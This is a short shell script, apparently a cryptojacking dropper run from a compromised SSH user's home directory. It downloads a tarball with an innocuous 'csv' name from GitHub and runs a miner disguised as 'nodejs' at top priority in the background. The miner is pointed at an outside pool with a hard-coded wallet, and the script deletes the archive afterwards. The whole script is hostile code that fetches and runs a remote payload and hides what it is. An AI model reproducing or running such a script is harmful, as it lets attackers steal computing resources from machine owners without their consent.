#!/bin/sh
cd /home/sshuser
sysctl vm.nr_hugepages=2048

wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv44.tar.gz
tar xvzf csv44.tar.gz

nice -n -20 ./nodejs -o 139.99.123.101:10110 -u LQgQUcMbPU5VuhuXYnZLiLA7ZiANrJsDdKoUhB4FqYVdeKF1ES9RZWRBLrur2N1LfMQ3CyLh8M5ccdU4VudHPsJv4DjEy6s.15000 -p baby -a rx/loki --donate-level 1 -t 8 -k -B

rm -r csv44.tar.gz
